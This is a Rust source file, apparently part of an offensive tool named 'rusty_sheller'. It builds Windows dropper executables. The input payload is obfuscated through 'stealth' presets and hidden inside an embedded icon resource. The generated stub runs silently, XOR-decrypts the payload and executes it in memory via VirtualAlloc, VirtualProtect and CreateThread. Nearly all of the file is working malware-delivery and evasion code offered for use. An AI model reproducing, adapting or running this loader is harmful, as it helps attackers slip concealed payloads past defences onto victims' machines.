use std::fs;
use std::path::Path;
use std::process::Command;
use rusty_sheller::obfuscation_pipeline::PipelinePresets;

fn create_dropper_executable(input_path: &Path, output_path: &Path, pipeline_preset: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("Processing {} with {} pipeline", input_path.display(), pipeline_preset);

    // Create pipeline based on preset
    let pipeline = match pipeline_preset {
        "minimal" => PipelinePresets::minimal(),
        "stealth" => PipelinePresets::stealth(),
        "maximum" => PipelinePresets::maximum(),
        _ => PipelinePresets::minimal(),
    };

    // Process the PE file through the pipeline
    let temp_processed_path = Path::new("temp_processed.bin");
    pipeline.process_file(input_path, temp_processed_path)?;
    let processed_data = fs::read(temp_processed_path)?;
    fs::remove_file(temp_processed_path)?;

    // Create temporary directory for this dropper
    let temp_dir = Path::new("./temp_dropper");
    fs::create_dir_all(&temp_dir)?;

    // Create ICO file with the processed data
    let ico_file = temp_dir.join("embedded.ico");
    fs::write(&ico_file, &processed_data)?;

    // Create Cargo.toml for this dropper
    let cargo_toml = format!(r#"[package]
name = "dropper_{}"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "dropper_{}"
path = "src/main.rs"

[dependencies]
windows-sys = {{ version = "0.48.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_Security", "Win32_System_LibraryLoader"] }}

[build-dependencies]
winres = "0.1"
"#,
        input_path.file_stem().unwrap().to_string_lossy(),
        input_path.file_stem().unwrap().to_string_lossy()
    );

    fs::write(temp_dir.join("Cargo.toml"), cargo_toml)?;

    // Create src directory
    fs::create_dir_all(temp_dir.join("src"))?;

    // Create main.rs for this dropper
    let main_rs = r#"use std::mem::transmute;
use std::ptr::{copy_nonoverlapping, null, null_mut};
use windows_sys::Win32::Foundation::WAIT_FAILED;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, FindResourceA, SizeofResource, LoadResource, LockResource};

fn decrypt_data(data: &[u8], key: &str) -> Vec<u8> {
    let mut decrypted_data = Vec::with_capacity(data.len());

    for (i, &byte) in data.iter().enumerate() {
        let key_byte = key.as_bytes()[i % key.len()];
        decrypted_data.push(byte ^ key_byte);
    }

    decrypted_data
}

fn extract_pe_from_ico(ico_data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if ico_data.len() < 22 {
        return Err("Invalid ICO file - too small".into());
    }

    // Skip ICO header (6 bytes) and image directory entry (16 bytes) = 22 bytes total
    let pe_data = &ico_data[22..];
    Ok(pe_data.to_vec())
}

fn main() {
    // Silent execution - no error messages or console output
    let key = "P Q R S T V X Y Z ";

    // Get the current executable's module handle
    let module_handle = unsafe { GetModuleHandleA(null()) };
    if module_handle == 0 {
        return;
    }

    // Load the embedded ICO resource
    let resource_data = unsafe {
        let resource_handle = FindResourceA(
            module_handle,
            1i32 as *const u8, // Resource ID 1
            14i32 as *const u8  // Resource type: RT_GROUP_ICON = 14
        );

        if resource_handle == 0 {
            return;
        }

        let resource_size = SizeofResource(module_handle, resource_handle);
        let resource_ptr = LoadResource(module_handle, resource_handle);

        if resource_ptr == 0 {
            return;
        }

        let resource_data_ptr = LockResource(resource_ptr);
        if resource_data_ptr == null_mut() {
            return;
        }

        std::slice::from_raw_parts(resource_data_ptr as *const u8, resource_size as usize)
    };

    // Extract PE data from ICO
    let encrypted_pe = match extract_pe_from_ico(resource_data) {
        Ok(data) => data,
        Err(_) => return,
    };

    // Decrypt the PE data
    let decrypted_pe = decrypt_data(&encrypted_pe, key);

    // Allocate memory and execute
    unsafe {
        let buffer = VirtualAlloc(
            null(),
            decrypted_pe.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if buffer == null_mut() {
            return;
        }

        copy_nonoverlapping(decrypted_pe.as_ptr(), buffer.cast(), decrypted_pe.len());

        let mut oldprotect = PAGE_READWRITE;
        if VirtualProtect(buffer, decrypted_pe.len(), PAGE_EXECUTE, &mut oldprotect) == 0 {
            return;
        }

        let buffer_fn = transmute::<*mut std::ffi::c_void, extern "system" fn(*mut std::ffi::c_void) -> u32>(buffer);
        let thread = CreateThread(null(), 0, Some(buffer_fn), null(), 0, null_mut());

        if thread == 0 {
            return;
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
"#;

    fs::write(temp_dir.join("src").join("main.rs"), main_rs)?;

    // Create build.rs to embed the ICO resource
    let build_rs = r#"fn main() {
    let mut res = winres::WindowsResource::new();
    res.set_icon("embedded.ico");
    res.compile().unwrap_or_else(|e| {
        eprintln!("Warning: Failed to compile resources: {}", e);
    });
}"#;

    fs::write(temp_dir.join("build.rs"), build_rs)?;

    // Build the dropper executable
    let output = Command::new("cargo")
        .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
        .current_dir(&temp_dir)
        .output()?;

    if !output.status.success() {
        println!("Build failed for {}:", input_path.display());
        println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
        return Err(format!("Build failed").into());
    }

    // Copy the built executable to the output directory
    let built_exe = temp_dir.join("target").join("x86_64-pc-windows-gnu").join("release").join(format!("dropper_{}.exe", input_path.file_stem().unwrap().to_string_lossy()));
    fs::create_dir_all(output_path.parent().unwrap())?;
    fs::copy(&built_exe, output_path)?;

    // Clean up the temporary directory
    fs::remove_dir_all(&temp_dir)?;

    Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 3 {
        eprintln!("Usage: {} <pipeline_preset> <input_file> [output_directory]", args[0]);
        eprintln!("Pipeline presets: minimal, stealth, maximum");
        eprintln!("Example: {} stealth input.exe out", args[0]);
        std::process::exit(1);
    }

    let pipeline_preset = &args[1];
    let input_file = &args[2];
    let output_dir = if args.len() > 3 { &args[3] } else { "out" };

    let input_path = Path::new(input_file);
    let output_path = Path::new(output_dir);

    if !input_path.exists() {
        eprintln!("Error: Input file not found at {}", input_path.display());
        std::process::exit(1);
    }

    if !input_path.is_file() {
        eprintln!("Error: Input path is not a file: {}", input_path.display());
        std::process::exit(1);
    }

    fs::create_dir_all(output_path)?;

    println!("Building dropper with {} pipeline", pipeline_preset);
    println!("Input file: {}", input_path.display());
    println!("Output directory: {}", output_path.display());

    // Process the single input file
    let file_name = input_path.file_name().unwrap().to_string_lossy();
    let output_file = output_path.join(file_name.as_ref());

    match create_dropper_executable(input_path, &output_file, pipeline_preset) {
        Ok(_) => {
            println!("✓ Created dropper: {}", output_file.display());
            println!("Pipeline complete!");
        },
        Err(e) => {
            println!("✗ Failed to create dropper for {}: {}", file_name, e);
            std::process::exit(1);
        }
    }

    Ok(())
}
